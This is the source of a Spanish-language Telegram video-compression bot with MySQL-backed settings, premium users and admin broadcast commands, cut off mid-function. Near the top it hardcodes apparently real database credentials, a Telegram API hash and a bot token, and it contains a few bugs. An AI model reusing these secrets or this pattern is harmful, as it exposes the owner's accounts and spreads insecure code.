import pyrogram
from pyrogram import Client, filters
from pyrogram.errors import UserAlreadyParticipant, InviteHashExpired, UsernameNotOccupied
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import UserNotParticipant
import os
import time
import asyncio
import pymysql
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import imageio_ffmpeg as ffmpeg
from pyrogram.errors import MessageNotModified

# Configuración de la base de datos
db_host = 'db4free.net'
db_user = 'appencoder'
db_password = 'appencoder'
db_name = 'appencoder'
CANAL_ID = "StvzUploadFree"  # Reemplaza con el ID de tu canal

def create_database_connection():
    try:
        connection = pymysql.connect(
            host=db_host,
            user=db_user,
            password=db_password,
            database=db_name,
            cursorclass=pymysql.cursors.DictCursor
        )
        return connection
    except Exception as e:
        print(f"Error al conectar a la base de datos: {e}")
        return None

def initialize_database():
    try:
        connection = create_database_connection()
        if connection is None:
            return False
            
        with connection.cursor() as cursor:
            # Crear tabla de usuarios si no existe
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id BIGINT PRIMARY KEY,
                    username VARCHAR(255),
                    is_premium BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Crear tabla de configuraciones si no existe
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS user_settings (
                    user_id BIGINT PRIMARY KEY,
                    format VARCHAR(10),
                    codec VARCHAR(20),
                    preset VARCHAR(20),
                    crf VARCHAR(10),
                    audio VARCHAR(10),
                    resolution VARCHAR(20),
                    pixel_format VARCHAR(20),
                    FOREIGN KEY (user_id) REFERENCES users(user_id) ON DELETE CASCADE
                )
            """)

            # En la función initialize_database(), añade esta tabla:
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS user_daily_usage (
                    user_id BIGINT,
                    date DATE,
                    video_count INT DEFAULT 0,
                    PRIMARY KEY (user_id, date)
                )
            """)
            connection.commit()
            return True
    except Exception as e:
        print(f"Error al inicializar la base de datos: {e}")
        return False
    finally:
        if connection:
            connection.close()

################################################################
async def get_daily_video_count(user_id):
    try:
        connection = create_database_connection()
        if connection is None:
            return 0
            
        today = time.strftime("%Y-%m-%d")
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT video_count FROM user_daily_usage 
                WHERE user_id = %s AND date = %s
            """, (user_id, today))
            result = cursor.fetchone()
            return result['video_count'] if result else 0
    except Exception as e:
        print(f"Error obteniendo conteo diario: {e}")
        return 0
    finally:
        if connection:
            connection.close()

async def increment_daily_video_count(user_id):
    try:
        connection = create_database_connection()
        if connection is None:
            return False
            
        today = time.strftime("%Y-%m-%d")
        with connection.cursor() as cursor:
            cursor.execute("""
                INSERT INTO user_daily_usage (user_id, date, video_count)
                VALUES (%s, %s, 1)
                ON DUPLICATE KEY UPDATE video_count = video_count + 1
            """, (user_id, today))
            connection.commit()
            return True
    except Exception as e:
        print(f"Error incrementando conteo diario: {e}")
        return False
    finally:
        if connection:
            connection.close()
############################################################
TRANSLATIONS = {
    'es': {
        'select_language': 'Por favor selecciona tu idioma preferido:',
        'language_selected': '¡Idioma español seleccionado!',
        'welcome_message': (
            "🎬 *Bienvenido a VideoCompress Pro* ⚡\n\n"
            "¡Hola! Gracias por utilizar nuestro servicio profesional de compresión de video. "
            "Optimiza tus archivos multimedia con tecnología inteligente manteniendo la máxima calidad posible\nUsuarios Premium tiene prioridad en el cola\nHaste Premiun con acceso a todas las funciones: 50 cup por un Mes👇🏻\n@Stvz20\n\n"
            "🔹 *Configuración actual:*\n"
            "• Formato: `{}`\n"
            "• Codec: `{}`\n"
            "• Preset: `{}`\n"
            "• Calidad (CRF): `{}`\n"
            "• Audio: `{}kbps`\n"
            "• Resolución: `{}`\n"
            "• Píxeles: `{}`\n\n"
            "📤 *Cómo comenzar:*\n"
            "1. Envía tu video.\n"
            "2. Espera confirmación del sistema\n"
            "3. Recibe tu archivo optimizado de 50 a un 70% sin sacrificar tu calidad\n\n"
            "⚙ Usa /settings para ajustar parámetros técnicos\n"
            "🛠 Soporte: @Stvz20"
        ),
        'compression_low': 'Compresión baja',
        'compression_medium': 'Compresión media', 
        'compression_high': 'Compresión alta',
        'video_info': '🎥 Información del video:\n📂 Nombre: {}\n⏱ Duración: {}s\n📏 Resolución: {}x{}\n📦 Tamaño: {:.2f}MB',
        'quality_timeout': '❌ Tiempo agotado. Envía el video nuevamente.',
        'downloading': '📥 Descargando video...',
        'download_complete': '✅ Descarga completada',
        'processing_complete': '✅ Procesamiento completado',
        'processing_error': '❌ Error al procesar',
        'queue_position': '🔄 Posición en cola: {}\n\nCola:\n{}',
        'large_size_error': '❌ Archivo demasiado grande (máx. 900MB)',
        'compression_progress': '🔧 Comprimiendo video...',
        'uploading': '⬆️ Subiendo video...',
        'compression_result': '🎥 Resultado:\n⏱ Tiempo: {:.2f}s\n📥 Original: {:.2f}MB\n📤 Comprimido: {:.2f}MB\n📊 Ratio: {:.2f}%',
        'quality_selected': '✅ Calidad seleccionada: {}',
        'settings_title': '⚙️ Configuración de compresión',
        'format_title': 'Selecciona el formato de salida:',
        'codec_title': 'Selecciona el códec de video:',
        'preset_title': 'Selecciona el preset de compresión:',
        'crf_title': 'Selecciona el valor CRF (calidad):',
        'audio_title': 'Selecciona la calidad de audio (kbps):',
        'resolution_title': 'RESOLUCIÓN/IMAGEN\nMantener original o reducir un nivel:',
        'pixel_title': '░▒▓██ COLOR/PIXELES ░▒▓██\nFormato de píxeles (calidad/rendimiento):',
        'current_settings': 'Configuración actual:\n🔹 Formato: {}\n🔹 Codec: {}\n🔹 Preset: {}\n🔹 CRF: {}\n🔹 Audio: {}k\n🔹 Resolución: {}\n🔹 Píxeles: {}',
        'close': '❌ Cerrar',
        'next': '➡️ Siguiente',
        'prev': '⬅️ Anterior',
        'loading_settings': '⚙️ Cargando configuración...',
        'invalid_message': '❌ Mensaje no válido',
        'action_error': '❌ Error al procesar la acción',
        'keep_original': 'Mantener original',
        'reduce_level': 'Reducir un nivel',
        'pixel_8bit': 'yuv422p (8bit - más rápido)',
        'pixel_10bit': 'yuv422p10le (10bit - mejor color)',
        'mp4_format': 'MP4',
        'webm_format': 'WebM',
        'mkv_format': 'MKV',
        'gif_format': 'GIF',
        'mpeg2_format': 'MPEG-2',
        'premium_info': '🎟️ Usuario premium detectado. Tus videos se procesarán sin esperar en la cola.',
        'active_task_error': '❌ Ya tienes una tarea activa. Espera a que se complete antes de enviar otro video.',
        'queue_task_error': '❌ Ya tienes un video en la cola. Espera a que se procese antes de enviar otro.',
        'cancel_button': '❌ Cancelar',
        'task_cancelled': '✅ Tarea cancelada exitosamente.',
        'queue_cancelled': '✅ Video eliminado de la cola exitosamente.',
        'no_task_to_cancel': '❌ No tienes ninguna tarea activa para cancelar.',
        'no_queue_to_cancel': '❌ No tienes ningún video en la cola para cancelar.',
        'premium_added': '✅ Usuario {} añadido como premium correctamente.',
        'premium_removed': '✅ Usuario {} eliminado de premium correctamente.',
        'user_not_found': '❌ Usuario no encontrado.',
        'admin_only': '❌ Solo los administradores pueden usar este comando.',
        'invalid_username': '❌ Nombre de usuario no válido. Usa /add_premium @username o ID.',
        'premium_list': '🌟 Lista de usuarios premium:\n\n{}'
    }
}


# Configuración por defecto
DEFAULT_SETTINGS = {
    'format': 'mp4',          # MP4 para compatibilidad
    'codec': 'libx265',       # Mejor compresión que libx264
    'preset': 'superfast',     # Equilibrio velocidad/compresión
    'crf': '35',              # Buen balance calidad/tamaño
    'audio': '64',            # Suficiente para voz/música
    'resolution': 'original',   # Reducción inteligente de resolución
    'pixel_format': 'yuv420p' # 8-bit para velocidad
}

# Codecs disponibles por formato
CODECS_BY_FORMAT = {
    'mp4': ['libx264', 'libx265'],
    'webm': ['libvpx', 'libvpx-vp9', 'libsvtav1'],
    'mkv': ['libx265', 'libsvtav1'],
    'gif': ['gif'],
    'mpeg2': ['mpeg2video']
}

# Codecs predeterminados por formato
DEFAULT_CODECS = {
    'mp4': 'libx265',
    'webm': 'libvpx-vp9',
    'mkv': 'libx265',
    'gif': 'gif',
    'mpeg2': 'mpeg2video'
}

# Funciones para manejar la base de datos
async def get_user_settings(user_id):
    try:
        connection = create_database_connection()
        if connection is None:
            return DEFAULT_SETTINGS.copy()
            
        with connection.cursor() as cursor:
            cursor.execute("SELECT * FROM user_settings WHERE user_id = %s", (user_id,))
            settings = cursor.fetchone()
            
            if settings:
                # Convertir a diccionario y eliminar user_id
                settings_dict = dict(settings)
                settings_dict.pop('user_id', None)
                return settings_dict
            else:
                # Crear registro por defecto si no existe
                default_settings = DEFAULT_SETTINGS.copy()
                cursor.execute("""
                    INSERT INTO user_settings 
                    (user_id, format, codec, preset, crf, audio, resolution, pixel_format)
                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
                """, (
                    user_id, 
                    default_settings['format'],
                    default_settings['codec'],
                    default_settings['preset'],
                    default_settings['crf'],
                    default_settings['audio'],
                    default_settings['resolution'],
                    default_settings['pixel_format']
                ))
                connection.commit()
                return default_settings
    except Exception as e:
        print(f"Error obteniendo configuraciones: {e}")
        return DEFAULT_SETTINGS.copy()
    finally:
        if connection:
            connection.close()

async def save_user_settings(user_id, settings):
    try:
        connection = create_database_connection()
        if connection is None:
            return False
            
        with connection.cursor() as cursor:
            cursor.execute("""
                INSERT INTO user_settings 
                (user_id, format, codec, preset, crf, audio, resolution, pixel_format)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
                ON DUPLICATE KEY UPDATE
                format = VALUES(format),
                codec = VALUES(codec),
                preset = VALUES(preset),
                crf = VALUES(crf),
                audio = VALUES(audio),
                resolution = VALUES(resolution),
                pixel_format = VALUES(pixel_format)
            """, (
                user_id, 
                settings['format'],
                settings['codec'],
                settings['preset'],
                settings['crf'],
                settings['audio'],
                settings['resolution'],
                settings['pixel_format']
            ))
            connection.commit()
            return True
    except Exception as e:
        print(f"Error guardando configuraciones: {e}")
        return False
    finally:
        if connection:
            connection.close()

async def is_premium_user(user_id):
    try:
        connection = create_database_connection()
        if connection is None:
            return False
            
        with connection.cursor() as cursor:
            cursor.execute("SELECT is_premium FROM users WHERE user_id = %s", (user_id,))
            user = cursor.fetchone()
            
            if user:
                return bool(user['is_premium'])
            else:
                # Crear registro de usuario si no existe
                cursor.execute("""
                    INSERT INTO users (user_id, is_premium)
                    VALUES (%s, FALSE)
                """, (user_id,))
                connection.commit()
                return False
    except Exception as e:
        print(f"Error verificando usuario premium: {e}")
        return False
    finally:
        if connection:
            connection.close()

async def add_premium_user(user_identifier):
    try:
        connection = create_database_connection()
        if connection is None:
            return False
            
        with connection.cursor() as cursor:
            # Intentar por ID
            if isinstance(user_identifier, int) or user_identifier.isdigit():
                cursor.execute("""
                    INSERT INTO users (user_id, is_premium)
                    VALUES (%s, TRUE)
                    ON DUPLICATE KEY UPDATE is_premium = TRUE
                """, (int(user_identifier),))
                connection.commit()
                return True
            
            # Intentar por username (sin @)
            elif isinstance(user_identifier, str) and not user_identifier.startswith('@'):
                cursor.execute("""
                    UPDATE users SET is_premium = TRUE
                    WHERE username = %s
                """, (user_identifier,))
                if cursor.rowcount > 0:
                    connection.commit()
                    return True
            
            # Intentar por @username
            elif isinstance(user_identifier, str) and user_identifier.startswith('@'):
                cursor.execute("""
                    UPDATE users SET is_premium = TRUE
                    WHERE username = %s
                """, (user_identifier[1:],))
                if cursor.rowcount > 0:
                    connection.commit()
                    return True
            
            return False
    except Exception as e:
        print(f"Error añadiendo usuario premium: {e}")
        return False
    finally:
        if connection:
            connection.close()

async def remove_premium_user(user_identifier):
    try:
        connection = create_database_connection()
        if connection is None:
            return False
            
        with connection.cursor() as cursor:
            # Intentar por ID
            if isinstance(user_identifier, int) or user_identifier.isdigit():
                cursor.execute("""
                    UPDATE users SET is_premium = FALSE
                    WHERE user_id = %s
                """, (int(user_identifier),))
                connection.commit()
                return cursor.rowcount > 0
            
            # Intentar por username (sin @)
            elif isinstance(user_identifier, str) and not user_identifier.startswith('@'):
                cursor.execute("""
                    UPDATE users SET is_premium = FALSE
                    WHERE username = %s
                """, (user_identifier,))
                connection.commit()
                return cursor.rowcount > 0
            
            # Intentar por @username
            elif isinstance(user_identifier, str) and user_identifier.startswith('@'):
                cursor.execute("""
                    UPDATE users SET is_premium = FALSE
                    WHERE username = %s
                """, (user_identifier[1:],))
                connection.commit()
                return cursor.rowcount > 0
            
            return False
    except Exception as e:
        print(f"Error eliminando usuario premium: {e}")
        return False
    finally:
        if connection:
            connection.close()

async def get_premium_users():
    try:
        connection = create_database_connection()
        if connection is None:
            return []
            
        with connection.cursor() as cursor:
            cursor.execute("""
                SELECT user_id, username FROM users 
                WHERE is_premium = TRUE
            """)
            return cursor.fetchall()
    except Exception as e:
        print(f"Error obteniendo usuarios premium: {e}")
        return []
    finally:
        if connection:
            connection.close()

async def register_user(user_id, username=None):
    try:
        connection = create_database_connection()
        if connection is None:
            return False
            
        with connection.cursor() as cursor:
            cursor.execute("""
                INSERT INTO users (user_id, username)
                VALUES (%s, %s)
                ON DUPLICATE KEY UPDATE username = IFNULL(username, VALUES(username))
            """, (user_id, username))
            connection.commit()
            return True
    except Exception as e:
        print(f"Error registrando usuario: {e}")
        return False
    finally:
        if connection:
            connection.close()

# ... (el resto del código se mantiene igual hasta los comandos del bot) ...
# Almacenamiento de configuraciones por usuario
user_settings = {}
user_active_tasks = {}  # Para controlar tareas activas por usuario
user_queue_tasks = {}   # Para controlar tareas en cola por usuario

# Configuración del bot
api_id = "23391886"
api_hash = "3974e78ee20876264d49e47e658ed86c" 
bot_token = "7814158827:AAHpfbB4CEQUQ4ADOgYqnGQK6kstPzttmAY"

app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

class ProcessingQueue:
    def __init__(self):
        self._queue = []  # Usar lista en lugar de Queue
        self.premium_count = 0

    async def put(self, task, is_premium=False):
        if is_premium:
            # Insertar después del último premium
            self._queue.insert(self.premium_count, task)
            self.premium_count += 1
        else:
            self._queue.append(task)

    async def get(self):
        return self._queue.pop(0) if self._queue else None

    def task_done(self):
        if self._queue and self.premium_count > 0:
            self.premium_count -= 1

    def qsize(self):
        return len(self._queue)

    def get_queue_list(self):
        return self._queue.copy()

processing_queue = ProcessingQueue()
current_processing = False
pending_selections = {}
active_tasks = {}
last_progress_update = 0

def human_readable_size(size):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024:
            return f"{size:.2f}{unit}"
        size /= 1024
    return f"{size:.2f}TB"

def get_resolution_options(width, height, reduce_level=True):
    if not reduce_level:
        return width, height
    
    resolutions = [
        (3840, 2160),  # 4K
        (2560, 1440),  # 2K
        (1920, 1080),  # 1080p
        (1280, 720),   # 720p
        (854, 480),     # 480p
        (640, 360)     # 360p
    ]
    
    current_res = (width, height)
    if current_res in resolutions:
        index = resolutions.index(current_res)
        if index + 1 < len(resolutions):
            return resolutions[index + 1]
    
    # Lógica para resoluciones no estándar
    new_width = width // 1.5
    new_height = height // 1.5
    
    # Redondear a múltiplos de 2 para compatibilidad con codecs
    new_width = int(new_width) // 2 * 2
    new_height = int(new_height) // 2 * 2
    
    return new_width, new_height

async def format_queue_list(queue_list, current_user_id=None):
    """Formatea la lista de la cola mostrando premium primero"""
    formatted = []
    for i, task in enumerate(queue_list, 1):
        username = task.get('username', '')
        user_id = task.get('user_id')
        
        # Verificar si el usuario es premium (consulta a la base de datos)
        is_premium = await is_premium_user(user_id) if user_id else False
        premium_indicator = "🌟 " if is_premium else ""
        
        if user_id == current_user_id:
            username = f"{premium_indicator}{username} > Tú" if username else f"{premium_indicator}ID: {user_id} > Tú"
        else:
            username = f"{premium_indicator}{username}" if username else f"{premium_indicator}ID: {user_id}"
            
        formatted.append(f"{i}. {username}")
    
    return "\n".join(formatted) if formatted else "La cola está vacía"

async def update_queue_positions():
    """Actualiza las posiciones en cola para todas las tareas pendientes"""
    try:
        queue_list = processing_queue.get_queue_list()
        
        # Verificar si hay cambios en la cola
        last_queue_state = getattr(update_queue_positions, 'last_state', [])
        if queue_list == last_queue_state:
            return
        update_queue_positions.last_state = queue_list.copy()

        # Actualizar todas las tareas en la cola
        for index, task in enumerate(queue_list, 1):
            try:
                if task and 'status_message' in task and task['status_message']:
                    # Obtener texto original sin sección de cola
                    original_text = task['status_message'].text.split('\n🔄')[0]
                    queue_text = await format_queue_list(queue_list, task.get('user_id'))
                    
                    # Crear teclado con botón de cancelación
                    keyboard = InlineKeyboardMarkup([
                        [InlineKeyboardButton(TRANSLATIONS['es']['cancel_button'], 
                         callback_data=f"cancel_task_{task['message'].id}")]
                    ])
                    
                    # Construir nuevo texto
                    new_text = f"{original_text}\n🔄 Posición en cola: {index}\n\nCola:\n{queue_text}"
                    
                    # Editar solo si hay cambios
                    await safe_edit_message(
                        client=task['client'],
                        message=task['status_message'],
                        text=new_text,
                        reply_markup=keyboard
                    )
            except Exception as e:
                print(f"Error actualizando posición para tarea {index}: {e}")

        # Actualizar tareas activas siendo procesadas
        for task in list(active_tasks.values()):
            try:
                if task and 'status_message' in task and task['status_message']:
                    original_text = task['status_message'].text.split('\n🔄')[0]
                    queue_text = format_queue_list(queue_list, task.get('user_id'))
                    new_text = f"{original_text}\n🔄 Posición en cola: {index}\n\nCola:\n{queue_text}"
                    # Crear teclado con botón de cancelación
                    keyboard = InlineKeyboardMarkup([
                        [InlineKeyboardButton(TRANSLATIONS['es']['cancel_button'], 
                         callback_data=f"cancel_task_{task['message'].id}")]
                    ])
                    await safe_edit_message(
                        client=task['client'],
                        message=task['status_message'],
                        #text=f"{original_text}\n⚡ Procesando tu video ahora...",
                        text=next,
                        reply_markup=None
                    )
            except Exception as e:
                print(f"Error actualizando tarea activa: {e}")

    except Exception as e:
        print(f"Error crítico en update_queue_positions: {e}")

async def throttled_progress(current, total, client, message, status):
    """Actualización de progreso con throttling de 3 segundos"""
    global last_progress_update
    
    now = time.time()
    if now - last_progress_update < 3 and current != total:
        return
    
    last_progress_update = now
    try:
        if message is None:
            return
            
        percentage = (current * 100) / total
        # Solo actualizar si el porcentaje ha cambiado al menos un 1%
        current_percentage = getattr(message, 'last_percentage', 0)
        if abs(percentage - current_percentage) < 1:
            return
            
        progress_bar = "▓" * int(percentage/10) + "░" * (10 - int(percentage/10))
        text = message.text.split('Progreso:')[0] if 'Progreso:' in message.text else message.text
        new_text = f"{text}\nProgreso: {progress_bar} {percentage:.1f}%\n{human_readable_size(current)}/{human_readable_size(total)}"
        
        # Actualizar solo si el texto es diferente
        if new_text != message.text:
            await client.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.id,
                text=new_text
            )
            message.last_percentage = percentage  # Almacenar último porcentaje
            
    except MessageNotModified:
        pass  # Ignorar si no hay cambios
    except Exception as e:
        print(f"Error en progreso: {e}")

async def safe_edit_message(client, message, text, reply_markup=None):
    """Función segura para editar mensajes con manejo de errores"""
    try:
        if message and hasattr(message, 'edit_text'):
            # Verificar si el texto es el mismo que el actual
            current_text = getattr(message, 'text', None)
            if current_text == text:
                return True  # No editar si no hay cambios
            await message.edit_text(
                text=text,
                reply_markup=reply_markup
            )
            return True
        return False
    except MessageNotModified:
        if "Configuración" in text:
            await message.edit_text(
                text=text,
                reply_markup=reply_markup
            )
        # Ignorar si el mensaje no ha cambiado
        return True
    except Exception as e:
        print(f"Error editando mensaje: {e}")
        if message and hasattr(message, 'chat'):
            await client.send_message(
                chat_id=message.chat.id,
                text=text,
                reply_markup=reply_markup
            )
        return False


# Agrega esto con las otras constantes al inicio del archivo
ADMIN_USERS = ["Stvz20", 5416296262]  # Usuarios administradores
#################
# Agrega este comando junto con los demás comandos del bot
@app.on_message(filters.command("enviar") & filters.user(ADMIN_USERS))  # Solo para administradores
async def broadcast_command(client, message):
    
    try:
        # Verificar si el comando es una respuesta a otro mensaje
        if not message.reply_to_message:
            await message.reply_text("❌ Por favor responde al mensaje que deseas enviar a todos los usuarios.")
            return

        # Obtener todos los usuarios registrados
        try:
            connection = create_database_connection()
            if connection is None:
                await message.reply_text("❌ Error al conectar con la base de datos.")
                return
                
            with connection.cursor() as cursor:
                cursor.execute("SELECT user_id FROM users")
                users = cursor.fetchall()
                
        except Exception as e:
            print(f"Error obteniendo usuarios: {e}")
            await message.reply_text("❌ Error al obtener la lista de usuarios.")
            return
        finally:
            if connection:
                connection.close()

        if not users:
            await message.reply_text("❌ No hay usuarios registrados.")
            return

        total_users = len(users)
        success_count = 0
        fail_count = 0
        progress_msg = await message.reply_text(f"📤 Enviando mensaje a {total_users} usuarios...\n"
                                              f"✅ Correctos: 0\n"
                                              f"❌ Fallidos: 0")

        # Enviar el mensaje a cada usuario
        for user in users:
            user_id = user['user_id']
            try:
                # Reenviar el mensaje respondido
                await message.reply_to_message.copy(user_id)
                success_count += 1
            except Exception as e:
                print(f"Error enviando a {user_id}: {e}")
                fail_count += 1
            
            # Actualizar progreso cada 10 envíos
            if (success_count + fail_count) % 10 == 0:
                try:
                    await progress_msg.edit_text(f"📤 Enviando mensaje a {total_users} usuarios...\n"
                                               f"✅ Correctos: {success_count}\n"
                                               f"❌ Fallidos: {fail_count}")
                except:
                    pass

        # Resultado final
        await progress_msg.edit_text(f"📤 Mensaje enviado a {total_users} usuarios\n"
                                   f"✅ Correctos: {success_count}\n"
                                   f"❌ Fallidos: {fail_count}")

    except Exception as e:
        print(f"Error en broadcast_command: {e}")
        await message.reply_text("❌ Ocurrió un error al procesar el comando.")
##################
# Modificamos el comando start para usar la base de datos
@app.on_message(filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("📢 Unirse al Canal", url="https://t.me/StvzUploadFree")],
        ]
    )
    try:
        member = await client.get_chat_member(CANAL_ID, user_id)
        if member.status in ["left", "kicked"]:
            await message.reply_text(
                "⚠️ **Debes unirte a nuestro canal para usar este bot.**\n\n",
                reply_markup=keyboard
            )
            return
    except UserNotParticipant:
        await message.reply_text(
            "⚠️ **Debes unirte a nuestro canal para usar este bot.**\n\n",
            reply_markup=keyboard
        )
        return
    except Exception as e:
        await message.reply_text(f"Error al verificar la membresía: {e}")
        return
    try:
        if not message or not hasattr(message, 'from_user'):
            return

        user_id = message.from_user.id
        username = message.from_user.username
        
        # Registrar usuario en la base de datos
        await register_user(user_id, username)
        
        # Obtener configuraciones desde la base de datos
        settings = await get_user_settings(user_id)
        
        resolution_text = TRANSLATIONS['es']['keep_original'] if settings['resolution'] == 'original' else TRANSLATIONS['es']['reduce_level']
        pixel_text = TRANSLATIONS['es']['pixel_8bit'] if settings['pixel_format'] == 'yuv422p' else TRANSLATIONS['es']['pixel_10bit']
        
        await message.reply_text(
            TRANSLATIONS['es']['welcome_message'].format(
                TRANSLATIONS['es'][f"{settings['format']}_format"],
                settings['codec'].replace('lib', '').upper(),
                settings['preset'],
                settings['crf'],
                settings['audio'],
                resolution_text,
                pixel_text
            )
        )
    except Exception as e:
        print(f"Error en start_command: {e}")

# Modificamos el comando premium para usar la base de datos
@app.on_message(filters.command("premium"))
async def premium_command(client, message):
    try:
        if not message or not hasattr(message, 'from_user'):
            return

        user_id = message.from_user.id
        is_premium = await is_premium_user(user_id)
        
        if is_premium:
            await message.reply_text(TRANSLATIONS['es']['premium_info'])
        else:
            await message.reply_text("❌ No estás en la lista de usuarios premium.")
    except Exception as e:
        print(f"Error en premium_command: {e}")

# Nuevo comando para añadir usuarios premium
@app.on_message(filters.command("add_premium") & filters.user(["Stvz20", 5416296262]))  # Solo administradores
async def add_premium_command(client, message):
    try:
        if not message or not hasattr(message, 'text'):
            return

        # Obtener el argumento (username o ID)
        args = message.text.split()
        if len(args) < 2:
            await message.reply_text(TRANSLATIONS['es']['invalid_username'])
            return
            
        user_identifier = args[1]
        
        # Intentar añadir como premium
        success = await add_premium_user(user_identifier)
        
        if success:
            await message.reply_text(TRANSLATIONS['es']['premium_added'].format(user_identifier))
        else:
            await message.reply_text(TRANSLATIONS['es']['user_not_found'])
    except Exception as e:
        print(f"Error en add_premium_command: {e}")
        await message.reply_text(TRANSLATIONS['es']['action_error'])

# Nuevo comando para eliminar usuarios premium
@app.on_message(filters.command("remove_premium") & filters.user(["Stvz20", 5416296262]))  # Solo administradores
async def remove_premium_command(client, message):
    try:
        if not message or not hasattr(message, 'text'):
            return

        # Obtener el argumento (username o ID)
        args = message.text.split()
        if len(args) < 2:
            await message.reply_text(TRANSLATIONS['es']['invalid_username'])
            return
            
        user_identifier = args[1]
        
        # Intentar eliminar de premium
        success = await remove_premium_user(user_identifier)
        
        if success:
            await message.reply_text(TRANSLATIONS['es']['premium_removed'].format(user_identifier))
        else:
            await message.reply_text(TRANSLATIONS['es']['user_not_found'])
    except Exception as e:
        print(f"Error en remove_premium_command: {e}")
        await message.reply_text(TRANSLATIONS['es']['action_error'])

# Nuevo comando para listar usuarios premium
@app.on_message(filters.command("list_premium") & filters.user(["Stvz20", 5416296262]))  # Solo administradores
async def list_premium_command(client, message):
    try:
        premium_users = await get_premium_users()
        
        if not premium_users:
            await message.reply_text("No hay usuarios premium registrados.")
            return
            
        users_list = []
        for i, user in enumerate(premium_users, 1):
            user_id = user['user_id']
            username = user['username'] or f"ID: {user_id}"
            users_list.append(f"{i}. {username}")
            
        await message.reply_text(TRANSLATIONS['es']['premium_list'].format("\n".join(users_list)))
    except Exception as e:
        print(f"Error en list_premium_command: {e}")
        await message.reply_text(TRANSLATIONS['es']['action_error'])

# Modificamos el comando setup para usar la base de datos
@app.on_message(filters.command("setup"))
async def settings_command(client, message):
    try:
        if not message or not hasattr(message, 'from_user'):
            return

        user_id = message.from_user.id
        await register_user(user_id, message.from_user.username)
        
        msg = await client.send_message(
            chat_id=message.chat.id,
            text=TRANSLATIONS['es']['loading_settings'],
            reply_to_message_id=message.id
        )
        
        await show_format_settings(client, msg, user_id)
        
    except Exception as e:
        print(f"Error en settings_command: {e}")
        if message and hasattr(message, 'chat'):
            await message.reply_text(TRANSLATIONS['es']['action_error'])

# Constantes para administradores (al inicio del archivo, después de los imports)
ADMIN_USERS = ["Stvz20", 5416296262]  # Usuarios administradores

# Función show_format_settings
async def show_format_settings(client, message, user_id=None):
    try:
        if not message:
            return

        if user_id is None:
            if not hasattr(message, 'from_user'):
                return
            user_id = message.from_user.id
        
        settings = await get_user_settings(user_id)
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    f"{'✅ ' if settings['format'] == 'mp4' else ''}{TRANSLATIONS['es']['mp4_format']}", 
                    callback_data="format_mp4"
                ),
                InlineKeyboardButton(
                    f"{'✅ ' if settings['format'] == 'webm' else ''}{TRANSLATIONS['es']['webm_format']}", 
                    callback_data="format_webm"
                )
            ],
            [
                InlineKeyboardButton(
                    f"{'✅ ' if settings['format'] == 'mkv' else ''}{TRANSLATIONS['es']['mkv_format']}", 
                    callback_data="format_mkv"
                ),
                InlineKeyboardButton(
                    f"{'✅ ' if settings['format'] == 'gif' else ''}{TRANSLATIONS['es']['gif_format']}", 
                    callback_data="format_gif"
                )
            ],
            [
                InlineKeyboardButton(
                    f"{'✅ ' if settings['format'] == 'mpeg2' else ''}{TRANSLATIONS['es']['mpeg2_format']}", 
                    callback_data="format_mpeg2"
                )
            ],
            [
                InlineKeyboardButton(TRANSLATIONS['es']['close'], callback_data="close_settings"),
                InlineKeyboardButton(TRANSLATIONS['es']['next'], callback_data="next_codec")
            ]
        ])
        
        text = f"{TRANSLATIONS['es']['settings_title']}\n\n{TRANSLATIONS['es']['format_title']}"
        
        # Editar directamente el mensaje
        await message.edit_text(
            text=text,
            reply_markup=keyboard
        )
        
    except Exception as e:
        print(f"Error en show_format_settings: {e}")
        if message and hasattr(message, 'chat'):
            await client.send_message(
                chat_id=message.chat.id,
                text=TRANSLATIONS['es']['action_error']
            )

# Función show_codec_settings
async def show_codec_settings(client, message, user_id=None):
    try:
        if not message:
            return

        if user_id is None:
            if not hasattr(message, 'from_user'):
                return
            user_id = message.from_user.id
        
        settings = await get_user_settings(user_id)
        available_codecs = CODECS_BY_FORMAT.get(settings['format'], ['libx264'])
        
        buttons = []
        row = []
        
        for codec in available_codecs:
            codec_name = codec.replace('lib', '').upper()
            if codec == 'libvpx-vp9':
                codec_name = 'VP9'
            elif codec == 'mpeg2video':
                codec_name = 'MPEG-2'
            elif codec == 'gif':
                codec_name = 'GIF'
                
            row.append(InlineKeyboardButton(
                f"{'✅ ' if settings['codec'] == codec else ''}{codec_name}", 
                callback_data=f"codec_{codec}"
            ))
            
            if len(row) == 2:
                buttons.append(row)
                row = []
        
        if row:
            buttons.append(row)
        
        buttons.append([
            InlineKeyboardButton(TRANSLATIONS['es']['prev'], callback_data="prev_format"),
            InlineKeyboardButton(TRANSLATIONS['es']['close'], callback_data="close_settings"),
            InlineKeyboardButton(TRANSLATIONS['es']['next'], callback_data="next_preset")
        ])
        
        keyboard = InlineKeyboardMarkup(buttons)

        await message.edit_text(
            text=f"{TRANSLATIONS['es']['settings_title']}\n\n{TRANSLATIONS['es']['codec_title']}",
            reply_markup=keyboard
        )
        
    except Exception as e:
        print(f"Error en show_codec_settings: {e}")
        if message and hasattr(message, 'chat'):
            await client.send_message(
                chat_id=message.chat.id,
                text=TRANSLATIONS['es']['action_error']
            )

# Función show_preset_settings
async def show_preset_settings(client, message, user_id=None):
    try:
        if not message:
            return

        if user_id is None:
            if not hasattr(message, 'from_user'):
                return
            user_id = message.from_user.id
        
        settings = await get_user_settings(user_id)
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    f"{'✅ ' if settings['preset'] == 'slow' else ''}Slow", 
                    callback_data="preset_slow"
                ),
                InlineKeyboardButton(
